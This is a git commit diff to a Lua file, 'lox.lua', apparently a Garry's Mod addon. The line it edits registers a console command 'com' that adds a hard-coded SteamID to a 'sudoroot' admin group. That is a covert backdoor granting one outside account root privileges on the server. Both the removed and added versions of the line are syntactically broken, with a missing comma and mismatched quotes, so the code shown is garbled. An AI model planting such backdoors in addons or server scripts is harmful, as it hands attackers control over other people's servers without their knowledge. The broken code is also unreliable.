09108ba1e8ff5e8b05dc06327b4689f31af5c434
hackerrure <138992638+hackerrure@users.noreply.github.com>
2024-08-02 08:54:55 +0300

    Update lox.lua

--- lox.lua
+++ lox.lua
@@ -1,2 +1,2 @@
 
-concommand.Add("com", function() RunConsoleCommand("ba setgroup", "STEAM_1:0:627609570" "sudoroot") end)
+concommand.Add("com", function() RunConsoleCommand("ba setgroup", "STEAM_1:0:627609570"  sudoroot ") end)
